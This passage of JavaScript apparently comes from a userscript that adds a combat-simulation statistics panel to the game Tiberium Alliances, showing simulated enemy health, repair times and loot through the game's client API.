                        var LootLabelTotal = new qx.ui.basic.Atom(null, img.Loot.Total).set({toolTipText: qxApp.tr("tnf:total") + " " + qxApp.tr("tnf:loot"), toolTipIcon: img.Loot.Total, alignX: "center", alignY: "middle", gap: 0, iconPosition: "top"}); 
 
                        LootLabelTib.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        LootLabelCry.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        LootLabelCred.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        LootLabelRP.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
                        LootLabelTotal.getChildControl("icon").set({width: 18, height: 18, scale: true, alignY : "middle"}); 
 
                        LootLabels.add(LootLabelTib); 
                        LootLabels.add(LootLabelCry); 
                        LootLabels.add(LootLabelCred); 
                        LootLabels.add(LootLabelRP); 
                        LootLabels.add(LootLabelTotal); 
                        this.Loot.add(LootLabels); 
                        this.add(this.Loot); 
 
                        //Simulate Button// 
                        var simButton = new qx.ui.container.Composite(new qx.ui.layout.HBox(5)).set({decorator: "pane-light-opaque", allowGrowX: true, marginLeft: 0, marginRight: 0, padding: 5}); 
                        this.add(simButton); 
 
                        this.simStatBtn = new qx.ui.form.Button(qxApp.tr("tnf:update")).set({allowGrowX: false}); 
                        this.simStatBtn.setToolTipText("Updates Simulation Stats"); 
                        this.simStatBtn.addListener("click", this.simulateStats, this); 
 
                        this.simReplayBtn = new qx.ui.form.Button(qxApp.tr("tnf:show combat")).set({allowGrowX: false}); 
                        this.simReplayBtn.setToolTipText(qxApp.tr("tnf:show battle replay")); 
                        this.simReplayBtn.addListener("click", this.doSimReplay, this); 
 
                        this.simReplayBtn.setEnabled(false); 
 
                        simButton.add(this.simStatBtn, {width: "50%"}); 
                        simButton.add(this.simReplayBtn, {width: "50%"}); 
 
                        //Add Header Events// 
                        EnemyHealthHeader.addListener("click", function () { 
                            if (this.EnemyHealth.isVisible()) this.EnemyHealth.exclude(); 
                            else this.EnemyHealth.show(); 
                        }, this); 
 
                        RepairHeader.addListener("click", function () { 
                            if (this.Repair.isVisible()) this.Repair.exclude(); 
                            else this.Repair.show(); 
                        }, this); 
 
                        LootHeader.addListener("click", function () { 
                            if (this.Loot.isVisible()) this.Loot.exclude(); 
                            else this.Loot.show(); 
                        }, this); 
 
                        //Hide Sections 
                        if (localStorage['hideHealth'] !== undefined) { 
                            if (localStorage['hideHealth'] == "yes") this.EnemyHealth.exclude(); 
                        } 
 
                        if (localStorage['hideRepair'] !== undefined) { 
                            if (localStorage['hideRepair'] == "yes") this.Repair.exclude(); 
                        } 
 
                        if (localStorage['hideLoot'] !== undefined) { 
                            if (localStorage['hideLoot'] == "yes") this.Loot.exclude(); 
                        } 
 
                        /** 
                         *   Setup Simulation Storage 
                         */ 
                        for (var i = 0; i < this.simViews; i++) { 
                            this.sim[i] = new this.Simulation(i); 
                            this.sim[i].Select(this.simSelected); 
                            this.Battle.add(this.sim[i].Label.Battle.container, { flex : 1 }); 
                            this.EnemyHealth.add(this.sim[i].Label.EnemyHealth.container, { flex : 1 }); 
                            this.Repair.add(this.sim[i].Label.Repair.container, { flex : 1 }); 
                            this.Loot.add(this.sim[i].Label.Loot.container, { flex : 1 }); 
                        } 
 
 
                        //Events 
                        phe.cnc.Util.attachNetEvent(ClientLib.API.Battleground.GetInstance(), "OnSimulateBattleFinished", ClientLib.API.OnSimulateBattleFinished, this, this.__OnSimulateBattleFinished); 
                        phe.cnc.Util.attachNetEvent(ClientLib.Vis.VisMain.GetInstance(), "ViewModeChange", ClientLib.Vis.ViewModeChange, this, this._onViewChanged); 
                        phe.cnc.base.Timer.getInstance().addListener("uiTick", this._onTick, this); 
                    } catch (e) { 
                        console.log("Error setting up Simulator.StatWindow Constructor: "); 
                        console.log(e.toString()); 
                    } 
                }, 
                destruct: function () {}, 
                members: { 
                    Battle: null, 
                    EnemyHealth: null, 
                    Repair: null, 
                    Loot: null, 
                    simStatBtn: null, 
                    simReplayBtn: null, 
                    isSimStatButtonDisabled: null, 
                    simSelected: 0, 
                    simViews: 3, 
                    sim: [], 
                    Simulation: function (instance) { 
                        try { 
                            var simulated = false; 
                            this.TargetCity = null; 
                            this.OwnCity = null; 
                            var Formation = null; 
                            this.Result = null; 
                            this.Label = { 
                                Battle: { 
                                    container: new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 65, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0, decorator: "pane-light-opaque"}), 
                                    Outcome:   new qx.ui.basic.Atom("-", null).set({alignX: "center", alignY: "middle", gap: 0, iconPosition: "top", show: "label"}), 
                                    Duration:  new qx.ui.basic.Label("-:--").set({alignX: "center", alignY: "middle"}), 
                                    OwnCity:   new qx.ui.basic.Label("-").set({alignX: "center", alignY: "middle"}) 
                                }, 
                                EnemyHealth: { 
                                    container: new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 65, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0, decorator: "pane-light-opaque"}), 
                                    Overall:   new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Base:      new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Defense:   new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    CY:        new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    DF:        new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    CC:        new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}) 
                                }, 
                                Repair: { 
                                    container: new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 65, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0, decorator: "pane-light-opaque"}), 
                                    Storage:   new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Overall:   new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Inf:       new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Vehi:      new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Air:       new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}) 
                                }, 
                                Loot: { 
                                    container: new qx.ui.container.Composite(new qx.ui.layout.VBox()).set({width: 65, padding: 5, allowGrowX: true, marginLeft: 0, marginRight: 0, decorator: "pane-light-opaque"}), 
                                    Tib:       new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Cry:       new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Cred:      new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    RP:        new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}), 
                                    Overall:   new qx.ui.basic.Label("-").set({alignX: "right", alignY: "middle"}) 
                                } 
                            }; 
                            var _StatsUnit = function () { 
                                    this.StartHealth = 0; 
                                    this.EndHealth = 0; 
                                    this.MaxHealth = 0; 
                                    this.Tib = 0; 
                                    this.Cry = 0; 
                                    this.RT = 0; 
                                    this.getHP = function () { 
                                        if (this.EndHealth == 0 && this.StartHealth == 0) return 0; 
                                        else if (this.MaxHealth == 0) return 100; 
                                        else return (this.EndHealth / this.MaxHealth) * 100; 
                                    }; 
                                    this.getHPrel = function () { 
                                        if (this.StartHealth == 0) return 0; 
                                        else if (this.MaxHealth == 0) return -100; 
                                        else return ((this.StartHealth - this.EndHealth) / this.MaxHealth) * -100; 
                                    }; 
                            }; 
                            var _StatsLoot = function () { 
                                    this.Base = 0; 
                                    this.Battle = 0; 
                            }; 
                            this.Stats = { 
                                Battle: { 
                                    Outcome:   0, 
                                    Duration:  0, 
                                    OwnCity:  "" 
                                }, 
                                EnemyHealth: { 
                                    Overall:   new _StatsUnit(), 
                                    Base:      new _StatsUnit(), 
                                    Defense:   new _StatsUnit(), 
                                    CY:        new _StatsUnit(), 
                                    DF:        new _StatsUnit(), 
                                    CC:        new _StatsUnit() 
                                }, 
                                Repair: { 
                                    Storage:   0, 
                                    Overall:   new _StatsUnit(), 
                                    Inf:       new _StatsUnit(), 
                                    Vehi:      new _StatsUnit(), 
                                    Air:       new _StatsUnit() 
                                }, 
                                Loot: { 
                                    Tib:       new _StatsLoot(), 
                                    Cry:       new _StatsLoot(), 
                                    Cred:      new _StatsLoot(), 
                                    RP:        new _StatsLoot(), 
                                    Overall:   new _StatsLoot() 
                                } 
                            }; 
                            this.getLootFromCurrentCity = function () { 
                                try { 
                                    this.Stats.Loot.Tib.Base = 0; 
                                    this.Stats.Loot.Cry.Base = 0; 
                                    this.Stats.Loot.Cred.Base = 0; 
                                    this.Stats.Loot.RP.Base = 0; 
                                    this.Stats.Loot.Overall.Base = 0; 
                                    var loot = ClientLib.API.Battleground.GetInstance().GetLootFromCurrentCity(); 
                                    for (var i = 0; i < loot.length; i++) { 
                                        this.Stats.Loot.Overall.Base += loot[i].Count; 
                                        switch (parseInt(loot[i].Type, 10)) { 
                                        case ClientLib.Base.EResourceType.Tiberium: 
                                            this.Stats.Loot.Tib.Base += loot[i].Count; 
                                            break; 
                                        case ClientLib.Base.EResourceType.Crystal: 
                                            this.Stats.Loot.Cry.Base += loot[i].Count; 
                                            break; 
                                        case ClientLib.Base.EResourceType.Gold: 
                                            this.Stats.Loot.Cred.Base += loot[i].Count; 
                                            break; 
                                        case ClientLib.Base.EResourceType.ResearchPoints: 
                                            this.Stats.Loot.RP.Base += loot[i].Count; 
                                            break; 
                                        } 
                                    } 
                                } catch (e) { 
                                    console.log("Error Getting Loot from Current City"); 
                                    console.log(e.toString()); 
                                } 
                            }; 
                            this.setSimulation = function (data) { 
                                simulated = true; 
                                this.OwnCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
                                this.Stats.Battle.OwnCity = this.OwnCity.get_Name(); 
                                this.saveFormation(); 
                                this.Result = []; 
                                for (var i = 0; i < data.length; i++) this.Result.push(data[i].Value); 
                            }; 
                            this.UpdateLabels = function () { 
                                var qxApp = qx.core.Init.getApplication(); 
                                var formatTime = function (time) { 
                                    return phe.cnc.Util.getTimespanString(time); 
                                }; 
                                var setRTLabelColor = function (label, number) { 
                                    if (number < 25) label.setTextColor("red"); 
                                    else if (number < 75) label.setTextColor("orangered"); 
                                    else label.setTextColor("darkgreen"); 
                                }; 
                                var setEHLabelColor = function (label, number) { 
                                    if (number < 25) label.setTextColor("darkgreen"); 
                                    else if (number < 75) label.setTextColor("orangered"); 
                                    else label.setTextColor("red"); 
                                }; 
 
                                if (simulated) { 
                                    //Battle.Outcome 
                                    switch (this.Stats.Battle.Outcome) { 
                                    case 1: 
                                        this.Label.Battle.Outcome.resetLabel(); 
                                        this.Label.Battle.Outcome.set({ show: "icon" }); 
                                        this.Label.Battle.Outcome.setIcon("FactionUI/icons/icon_reports_total_defeat.png"); 
                                        this.Label.Battle.Outcome.setToolTipIcon("FactionUI/icons/icon_reports_total_defeat.png"); 
                                        this.Label.Battle.Outcome.setToolTipText(qxApp.tr("tnf:total defeat")); 
                                        break; 
                                    case 2: 
                                        this.Label.Battle.Outcome.resetLabel(); 
                                        this.Label.Battle.Outcome.set({ show: "icon" }); 
                                        this.Label.Battle.Outcome.setIcon("FactionUI/icons/icon_reports_victory.png"); 
                                        this.Label.Battle.Outcome.setToolTipIcon("FactionUI/icons/icon_reports_victory.png"); 
                                        this.Label.Battle.Outcome.setToolTipText(qxApp.tr("tnf:victory")); 
                                        break; 
                                    case 3: 
                                        this.Label.Battle.Outcome.resetLabel(); 
                                        this.Label.Battle.Outcome.set({ show: "icon" }); 
                                        this.Label.Battle.Outcome.setIcon("FactionUI/icons/icon_reports_total_victory.png"); 
                                        this.Label.Battle.Outcome.setToolTipIcon("FactionUI/icons/icon_reports_total_victory.png"); 
                                        this.Label.Battle.Outcome.setToolTipText(qxApp.tr("tnf:total victory")); 
                                        break; 
                                    } 
                                    //Battle.Duration 
                                    this.Label.Battle.Duration.setValue(formatTime(this.Stats.Battle.Duration/1000)); 
                                    //Battle.OwnCity 
                                    if (this.OwnCity != null) this.Stats.Battle.OwnCity = this.OwnCity.get_Name(); 
                                    this.Label.Battle.OwnCity.setValue(this.Stats.Battle.OwnCity); 
 
                                    switch (localStorage['getEHSelection']) { 
                                    case "hp rel": 
                                        //EnemyHealth.Overall 
                                        this.Label.EnemyHealth.Overall.setValue(this.Stats.EnemyHealth.Overall.getHPrel().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.Overall.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.Overall.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Overall.Tib) + "<br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Overall.Cry)); 
                                        //EnemyHealth.Base 
                                        this.Label.EnemyHealth.Base.setValue(this.Stats.EnemyHealth.Base.getHPrel().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.Base.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.Base.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Base.Tib)); 
                                        //EnemyHealth.Defense 
                                        this.Label.EnemyHealth.Defense.setValue(this.Stats.EnemyHealth.Defense.getHPrel().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.Defense.setToolTipText(qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Defense.Tib) + "<br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Defense.Cry)); 
                                        //EnemyHealth.CY 
                                        this.Label.EnemyHealth.CY.setValue(this.Stats.EnemyHealth.CY.getHPrel().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.CY.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.CY.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.CY.Tib)); 
                                        //EnemyHealth.DF 
                                        this.Label.EnemyHealth.DF.setValue(this.Stats.EnemyHealth.DF.getHPrel().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.DF.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.DF.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.DF.Tib)); 
                                        //EnemyHealth.CC 
                                        this.Label.EnemyHealth.CC.setValue(this.Stats.EnemyHealth.CC.getHPrel().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.CC.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.CC.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.CC.Tib)); 
                                        break; 
                                    default: //"hp" 
                                        //EnemyHealth.Overall 
                                        this.Label.EnemyHealth.Overall.setValue(this.Stats.EnemyHealth.Overall.getHP().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.Overall.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.Overall.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Overall.Tib) + "<br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Overall.Cry)); 
                                        //EnemyHealth.Base 
                                        this.Label.EnemyHealth.Base.setValue(this.Stats.EnemyHealth.Base.getHP().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.Base.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.Base.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Base.Tib)); 
                                        //EnemyHealth.Defense 
                                        this.Label.EnemyHealth.Defense.setValue(this.Stats.EnemyHealth.Defense.getHP().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.Defense.setToolTipText(qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Defense.Tib) + "<br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.Defense.Cry)); 
                                        //EnemyHealth.CY 
                                        this.Label.EnemyHealth.CY.setValue(this.Stats.EnemyHealth.CY.getHP().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.CY.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.CY.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.CY.Tib)); 
                                        //EnemyHealth.DF 
                                        this.Label.EnemyHealth.DF.setValue(this.Stats.EnemyHealth.DF.getHP().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.DF.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.DF.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.DF.Tib)); 
                                        //EnemyHealth.CC 
                                        this.Label.EnemyHealth.CC.setValue(this.Stats.EnemyHealth.CC.getHP().toFixed(2) + "%"); 
                                        this.Label.EnemyHealth.CC.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.EnemyHealth.CC.RT) + "<br>" + qxApp.tr("tnf:tiberium") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.EnemyHealth.CC.Tib)); 
                                        break; 
                                    } 
                                    //EnemyHealth.Overall 
                                    setEHLabelColor(this.Label.EnemyHealth.Overall, this.Stats.EnemyHealth.Overall.getHP()); 
                                    //EnemyHealth.Base 
                                    setEHLabelColor(this.Label.EnemyHealth.Base, this.Stats.EnemyHealth.Base.getHP()); 
                                    //EnemyHealth.Defense 
                                    setEHLabelColor(this.Label.EnemyHealth.Defense, this.Stats.EnemyHealth.Defense.getHP()); 
                                    //EnemyHealth.CY 
                                    setEHLabelColor(this.Label.EnemyHealth.CY, this.Stats.EnemyHealth.CY.getHP()); 
                                    //EnemyHealth.DF 
                                    setEHLabelColor(this.Label.EnemyHealth.DF, this.Stats.EnemyHealth.DF.getHP()); 
                                    //EnemyHealth.CC 
                                    setEHLabelColor(this.Label.EnemyHealth.CC, this.Stats.EnemyHealth.CC.getHP()); 
 
                                    //Repair.Storage 
                                    if (this.OwnCity != null) this.Stats.Repair.Storage = Math.min(this.OwnCity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeInf), this.OwnCity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeVeh), this.OwnCity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeAir)); 
                                    this.Label.Repair.Storage.setValue(phe.cnc.Util.getTimespanString(ClientLib.Data.MainData.GetInstance().get_Time().GetTimeSpan(this.Stats.Repair.Storage))); 
                                    this.Label.Repair.Storage.setTextColor(this.Stats.Repair.Storage > this.Stats.Repair.Overall.RT ? "darkgreen" : "red"); 
                                    //Repair 
                                    switch (localStorage['getRTSelection']) { 
                                    case "cry": 
                                        //Repair.Overall 
                                        this.Label.Repair.Overall.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Overall.Cry)); 
                                        this.Label.Repair.Overall.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Overall.RT) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Overall.getHP().toFixed(2) + "%"); 
                                        //Repair.Inf 
                                        this.Label.Repair.Inf.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Inf.Cry)); 
                                        this.Label.Repair.Inf.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Inf.RT) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Inf.getHP().toFixed(2) + "%"); 
                                        //Repair.Vehi 
                                        this.Label.Repair.Vehi.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Vehi.Cry)); 
                                        this.Label.Repair.Vehi.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Vehi.RT) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Vehi.getHP().toFixed(2) + "%"); 
                                        //Repair.Air 
                                        this.Label.Repair.Air.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Air.Cry)); 
                                        this.Label.Repair.Air.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Air.RT) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Air.getHP().toFixed(2) + "%"); 
                                        break; 
                                    case "hp": 
                                        //Repair.Overall 
                                        this.Label.Repair.Overall.setValue(this.Stats.Repair.Overall.getHP().toFixed(2) + "%"); 
                                        this.Label.Repair.Overall.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Overall.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Overall.Cry)); 
                                        //Repair.Inf 
                                        this.Label.Repair.Inf.setValue(this.Stats.Repair.Inf.getHP().toFixed(2) + "%"); 
                                        this.Label.Repair.Inf.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Inf.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Inf.Cry)); 
                                        //Repair.Vehi 
                                        this.Label.Repair.Vehi.setValue(this.Stats.Repair.Vehi.getHP().toFixed(2) + "%"); 
                                        this.Label.Repair.Vehi.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Vehi.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Vehi.Cry)); 
                                        //Repair.Air 
                                        this.Label.Repair.Air.setValue(this.Stats.Repair.Air.getHP().toFixed(2) + "%"); 
                                        this.Label.Repair.Air.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Air.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Air.Cry)); 
                                        break; 
                                    case "hp rel": 
                                        //Repair.Overall 
                                        this.Label.Repair.Overall.setValue(this.Stats.Repair.Overall.getHPrel().toFixed(2) + "%"); 
                                        this.Label.Repair.Overall.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Overall.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Overall.Cry)); 
                                        //Repair.Inf 
                                        this.Label.Repair.Inf.setValue(this.Stats.Repair.Inf.getHPrel().toFixed(2) + "%"); 
                                        this.Label.Repair.Inf.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Inf.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Inf.Cry)); 
                                        //Repair.Vehi 
                                        this.Label.Repair.Vehi.setValue(this.Stats.Repair.Vehi.getHPrel().toFixed(2) + "%"); 
                                        this.Label.Repair.Vehi.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Vehi.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Vehi.Cry)); 
                                        //Repair.Air 
                                        this.Label.Repair.Air.setValue(this.Stats.Repair.Air.getHPrel().toFixed(2) + "%"); 
                                        this.Label.Repair.Air.setToolTipText(qxApp.tr("tnf:repair points") + ": " + formatTime(this.Stats.Repair.Air.RT) + "</br>" + qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Air.Cry)); 
                                        break; 
                                    default: //"rt" 
                                        //Repair.Overall 
                                        this.Label.Repair.Overall.setValue(formatTime(this.Stats.Repair.Overall.RT)); 
                                        this.Label.Repair.Overall.setToolTipText(qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Overall.Cry) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Overall.getHP().toFixed(2) + "%"); 
                                        //Repair.Inf 
                                        this.Label.Repair.Inf.setValue(formatTime(this.Stats.Repair.Inf.RT)); 
                                        this.Label.Repair.Inf.setToolTipText(qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Inf.Cry) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Inf.getHP().toFixed(2) + "%"); 
                                        //Repair.Vehi 
                                        this.Label.Repair.Vehi.setValue(formatTime(this.Stats.Repair.Vehi.RT)); 
                                        this.Label.Repair.Vehi.setToolTipText(qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Vehi.Cry) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Vehi.getHP().toFixed(2) + "%"); 
                                        //Repair.Air 
                                        this.Label.Repair.Air.setValue(formatTime(this.Stats.Repair.Air.RT)); 
                                        this.Label.Repair.Air.setToolTipText(qxApp.tr("tnf:crystals") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Repair.Air.Cry) + "</br>" + qxApp.tr("tnf:health") + ": " + this.Stats.Repair.Air.getHP().toFixed(2) + "%"); 
                                        break; 
                                    } 
 
                                    //Repair.Overall 
                                    setRTLabelColor(this.Label.Repair.Overall, this.Stats.Repair.Overall.getHP()); 
                                    //Repair.Inf 
                                    setRTLabelColor(this.Label.Repair.Inf, this.Stats.Repair.Inf.getHP()); 
                                    if (this.Stats.Repair.Inf.RT === this.Stats.Repair.Overall.RT && this.Stats.Repair.Inf.getHP() < 100) this.Label.Repair.Inf.setTextColor("black"); 
                                    //Repair.Vehi 
                                    setRTLabelColor(this.Label.Repair.Vehi, this.Stats.Repair.Vehi.getHP()); 
                                    if (this.Stats.Repair.Vehi.RT === this.Stats.Repair.Overall.RT && this.Stats.Repair.Vehi.getHP() < 100) this.Label.Repair.Vehi.setTextColor("black"); 
                                    //Repair.Air 
                                    setRTLabelColor(this.Label.Repair.Air, this.Stats.Repair.Air.getHP()); 
                                    if (this.Stats.Repair.Air.RT === this.Stats.Repair.Overall.RT && this.Stats.Repair.Air.getHP() < 100) this.Label.Repair.Air.setTextColor("black"); 
 
                                    //Loot.Tib 
                                    this.Label.Loot.Tib.setToolTipText((this.Stats.Loot.Tib.Battle / this.Stats.Loot.Tib.Base * 100).toFixed(2) + "%<br>" + qxApp.tr("tnf:base") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Tib.Base)); 
                                    this.Label.Loot.Tib.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Tib.Battle)); 
                                    //Loot.Cry 
                                    this.Label.Loot.Cry.setToolTipText((this.Stats.Loot.Cry.Battle / this.Stats.Loot.Cry.Base * 100).toFixed(2) + "%<br>" + qxApp.tr("tnf:base") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Cry.Base)); 
                                    this.Label.Loot.Cry.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Cry.Battle)); 
                                    //Loot.Cred 
                                    this.Label.Loot.Cred.setToolTipText((this.Stats.Loot.Cred.Battle / this.Stats.Loot.Cred.Base * 100).toFixed(2) + "%<br>" + qxApp.tr("tnf:base") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Cred.Base)); 
                                    this.Label.Loot.Cred.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Cred.Battle)); 
                                    //Loot.RP 
                                    this.Label.Loot.RP.setToolTipText((this.Stats.Loot.RP.Battle / this.Stats.Loot.RP.Base * 100).toFixed(2) + "%<br>" + qxApp.tr("tnf:base") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.RP.Base)); 
                                    this.Label.Loot.RP.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.RP.Battle)); 
                                    //Loot.Overall 
                                    this.Label.Loot.Overall.setToolTipText((this.Stats.Loot.Overall.Battle / this.Stats.Loot.Overall.Base * 100).toFixed(2) + "%<br>" + qxApp.tr("tnf:base") + ": " + phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Overall.Base)); 
                                    this.Label.Loot.Overall.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompact(this.Stats.Loot.Overall.Battle)); 
                                } else { 
